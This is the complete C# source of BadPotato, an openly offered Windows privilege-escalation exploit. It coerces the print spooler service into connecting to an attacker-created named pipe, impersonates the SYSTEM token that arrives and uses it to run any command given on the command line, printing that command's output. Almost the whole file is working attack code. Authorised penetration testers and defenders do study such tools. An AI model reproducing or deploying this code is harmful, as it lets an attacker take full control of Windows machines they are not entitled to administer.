using PingCastle.RPC;
using System;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;
using System.Text;
using System.Threading;
using static PingCastle.RPC.rprn;

namespace BadPotato
{

    class ExecuteRectangle
    {
        public struct SECURITY_ATTRIBUTES
        {
           public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        static void Main(string[] args)
        {
            Console.WriteLine(@"[*]

    ____            ______        __        __      
   / __ )____ _____/ / __ \____  / /_____ _/ /_____ 
  / __  / __ `/ __  / /_/ / __ \/ __/ __ `/ __/ __ \
 / /_/ / /_/ / /_/ / ____/ /_/ / /_/ /_/ / /_/ /_/ /
/_____/\__,_/\__,_/_/    \____/\__/\__,_/\__/\____/ 

Github:https://github.com/BeichenDream/BadPotato/       By:BeichenDream
            ");

            if (args.Length<1)
            {
                Console.WriteLine("[!] No Command");
                return;   
            }

            SECURITY_ATTRIBUTES securityAttributes = new SECURITY_ATTRIBUTES();
            string pipeName = Guid.NewGuid().ToString("N");

            Console.WriteLine("[*] PipeName : " + string.Format("\\\\.\\pipe\\{0}\\pipe\\spoolss", pipeName));
            Console.WriteLine("[*] ConnectPipeName : " + string.Format("\\\\{0}/pipe/{1}", Environment.MachineName, pipeName));

            IntPtr pipeHandle = CreateNamedPipeW(string.Format("\\\\.\\pipe\\{0}\\pipe\\spoolss", pipeName), 0x00000003| 0x40000000, 0x00000000, 10, 2048, 2048, 0, ref securityAttributes);
            if (pipeHandle!=IntPtr.Zero)
            {
                Console.WriteLine(string.Format("[*] {0} Success! IntPtr:{1}", "CreateNamedPipeW",pipeHandle));
                rprn rprn = new rprn();
                DEVMODE_CONTAINER dEVMODE_CONTAINER = new DEVMODE_CONTAINER();
                IntPtr rpcPrinterHandle = IntPtr.Zero;
                rprn.RpcOpenPrinter(string.Format("\\\\{0}", Environment.MachineName), out rpcPrinterHandle, null, ref dEVMODE_CONTAINER, 0);
                if (rpcPrinterHandle!=IntPtr.Zero)
                {
                    if (rprn.RpcRemoteFindFirstPrinterChangeNotificationEx(rpcPrinterHandle, 0x00000100, 0, string.Format("\\\\{0}/pipe/{1}", Environment.MachineName, pipeName), 0) != -1)
                    {
                        Console.WriteLine(string.Format("[*] {0} Success! IntPtr:{1}", "RpcRemoteFindFirstPrinterChangeNotificationEx", rpcPrinterHandle));
                        Thread thread = new Thread(() => ConnectNamedPipe(pipeHandle, IntPtr.Zero));
                        thread.Start();
                        if (thread.Join(5000))
                        {
                            Console.WriteLine("[*] ConnectNamePipe Success!");
                            StringBuilder stringBuilder = new StringBuilder();
                            GetNamedPipeHandleState(pipeHandle, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Capacity);
                            Console.WriteLine("[*] CurrentUserName : " + Environment.UserName);
                            Console.WriteLine("[*] CurrentConnectPipeUserName : " + stringBuilder.ToString());
                            if (ImpersonateNamedPipeClient(pipeHandle))
                            {
                                Console.WriteLine("[*] ImpersonateNamedPipeClient Success!");
                                IntPtr hSystemToken = IntPtr.Zero;
                                if (OpenThreadToken(GetCurrentThread(), 983551, false, ref hSystemToken))
                                {
                                    Console.WriteLine(string.Format("[*] {0} Success! IntPtr:{1}", "OpenThreadToken", hSystemToken));
                                    IntPtr hSystemTokenDup = IntPtr.Zero;
                                    if (DuplicateTokenEx(hSystemToken, 983551, 0, 2, 1, ref hSystemTokenDup))
                                    {
                                        Console.WriteLine(string.Format("[*] {0} Success! IntPtr:{1}", "DuplicateTokenEx", hSystemTokenDup));
                                        if (SetThreadToken(IntPtr.Zero, hSystemToken))
                                        {
                                            Console.WriteLine("[*] SetThreadToken Success!");
                                            Console.WriteLine("[*] CurrentThreadUserName : " + WindowsIdentity.GetCurrent(true).Name);

                                            SECURITY_ATTRIBUTES saAttr = new SECURITY_ATTRIBUTES();
                                            IntPtr out_read = IntPtr.Zero;
                                            IntPtr out_write = IntPtr.Zero;
                                            IntPtr err_read = IntPtr.Zero;
                                            IntPtr err_write = IntPtr.Zero;

                                            saAttr.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
                                            saAttr.bInheritHandle = 0x1;
                                            saAttr.lpSecurityDescriptor = IntPtr.Zero;

                                            if (CreatePipe(ref out_read, ref out_write, ref saAttr, 0))
                                            {
                                                Console.WriteLine(string.Format("[*] {0} Success! out_read:{1} out_write:{2}", "CreateOutReadPipe", out_read, out_write));
                                            }
                                            else
                                            {
                                                Console.WriteLine("[!] CreateOutReadPipe fail!");
                                            }

                                            if (CreatePipe(ref err_read, ref err_write, ref saAttr, 0))
                                            {
                                                Console.WriteLine(string.Format("[*] {0} Success! err_read:{1} err_write:{2}", "CreateErrReadPipe", err_read, err_write));
                                            }
                                            else
                                            {
                                                Console.WriteLine("[!] CreateErrReadPipe fail!");
                                            }

                                            SetHandleInformation(out_read, 0x00000001, 0);
                                            SetHandleInformation(err_read, 0x00000001, 0);

                                            STARTUPINFO si = new STARTUPINFO();
                                            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                                            si.cb = Marshal.SizeOf(si);
                                            si.lpDesktop = @"WinSta0\Default";
                                            si.hStdOutput = out_write;
                                            si.hStdError = err_write;
                                            si.dwFlags |= 0x00000100;

                                            string lpApplicationName = Environment.SystemDirectory + "/cmd.exe";
                                            string lpCommandLine = "cmd /c " + args[0];
                                            // bool flag=CreateProcessAsUserW(hSystemTokenDup, null, lpCommandLine, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, Environment.SystemDirectory, ref si, out pi);
                                            if (CreateProcessWithTokenW(hSystemTokenDup, 0, null, lpCommandLine, 0x08000000, IntPtr.Zero, Environment.CurrentDirectory, ref si, out pi))
                                            {
                                                Console.WriteLine(string.Format("[*] {0} Success! ProcessPid:{1}", "CreateProcessWithTokenW", pi.dwProcessId));
                                                CloseHandle(out_write);
                                                CloseHandle(err_write);
                                                byte[] buf = new byte[4098];
                                                int dwRead = 0;
                                                while (ReadFile(out_read, buf, 4098, ref dwRead, IntPtr.Zero))
                                                {
                                                    byte[] outBytes = new byte[dwRead];
                                                    Array.Copy(buf, outBytes, dwRead);
                                                    Console.WriteLine(System.Text.Encoding.Default.GetString(outBytes));
                                                }
                                                while (ReadFile(err_read, buf, 4098, ref dwRead, IntPtr.Zero))
                                                {
                                                    byte[] outBytes = new byte[dwRead];
                                                    Array.Copy(buf, outBytes, dwRead);
                                                    Console.WriteLine(System.Text.Encoding.Default.GetString(outBytes));
                                                }
                                                
                                                CloseHandle(err_read);
                                                CloseHandle(out_read);
                                                CloseHandle(out_write);
                                                CloseHandle(err_write);
                                                CloseHandle(hSystemTokenDup);
                                                CloseHandle(hSystemToken);
                                                CloseHandle(rpcPrinterHandle);
                                                CloseHandle(pipeHandle);
                                                Console.WriteLine("[*] Bye!");
                                            }
                                            else
                                            {
                                                Console.WriteLine(new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
                                                Console.WriteLine("[!] CreateProcessWithTokenW fail!");
                                            }

                                        }
                                        else
                                        {
                                            Console.WriteLine(new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
                                            Console.WriteLine("[!] SetThreadToken fail!");
                                        }
                                    }
                                    else
                                    {
                                        Console.WriteLine(new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
                                        Console.WriteLine("[!] DuplicateTokenEx fail!");
                                    }
                                }
                                else
                                {
                                    Console.WriteLine(new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
                                    Console.WriteLine("[!] OpenThreadToken fail!");
                                }
                            }
                            else
                            {
                                Console.WriteLine(new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
                                Console.WriteLine("[!] ImpersonateNamedPipeClient fail!");
                            }
                        }
                        else
                        {
                            CloseHandle(rpcPrinterHandle);
                            CloseHandle(pipeHandle);
                            Console.WriteLine("[!] ConnectNamePipe Time Out!");
                        }
                    }
                    else
                    {
                        Console.WriteLine(new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
                        Console.WriteLine("[!] RpcRemoteFindFirstPrinterChangeNotificationEx fail!");
                    }
                }
                else
                {
                    CloseHandle(pipeHandle);
                    Console.WriteLine("[!] RpcOpenPrinter fail!");
                }
            }
            else
            {
                Console.WriteLine(new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
                Console.WriteLine("[!] CreateNamedPipeW fail!") ;
            }
        }
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool SetThreadToken(IntPtr pHandle, IntPtr hToken);
        [SecurityCritical]
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool CloseHandle(IntPtr handle);
        [DllImport("kernel32.dll", EntryPoint = "GetCurrentThread", CallingConvention = CallingConvention.Cdecl)]
        public static extern IntPtr GetCurrentThread();
        [SecurityCritical]
        [DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CreateNamedPipeW(string pipeName, int openMode, int pipeMode, int maxInstances, int outBufferSize, int inBufferSize, int defaultTimeout,ref SECURITY_ATTRIBUTES securityAttributes);
        [SecurityCritical]
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public  static extern bool ConnectNamedPipe(IntPtr handle, IntPtr overlapped);
        [SecurityCritical]
        [DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool GetNamedPipeHandleState(IntPtr hNamedPipe, IntPtr lpState, IntPtr lpCurInstances, IntPtr lpMaxCollectionCount, IntPtr lpCollectDataTimeout, StringBuilder lpUserName, int nMaxUserNameSize);

        [SecurityCritical]
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);
        [SecurityCritical]
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenThreadToken(IntPtr ThreadHandle, long DesiredAccess, bool OpenAsSelf,ref IntPtr TokenHandle);
        [SecurityCritical]
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DuplicateTokenEx(IntPtr hExistingToken,long dwDesiredAccess,int lpTokenAttributes,int ImpersonationLevel,int TokenType,ref IntPtr phNewToken);
        [SecurityCritical]
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
        [DllImport("userenv.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CreateEnvironmentBlock(ref IntPtr lpEnvironment,IntPtr hToken,bool bInherit);
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessAsUserW(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CreatePipe(ref IntPtr hReadPipe,ref IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, Int32 nSize);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetHandleInformation(IntPtr hObject, int dwMask, int dwFlags);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToRead, ref int lpNumberOfBytesRead, IntPtr lpOverlapped/*IntPtr.Zero*/);
        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(IntPtr hToken, int dwLogonFlags, string lpApplicationName, string lpCommandLine, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    }
}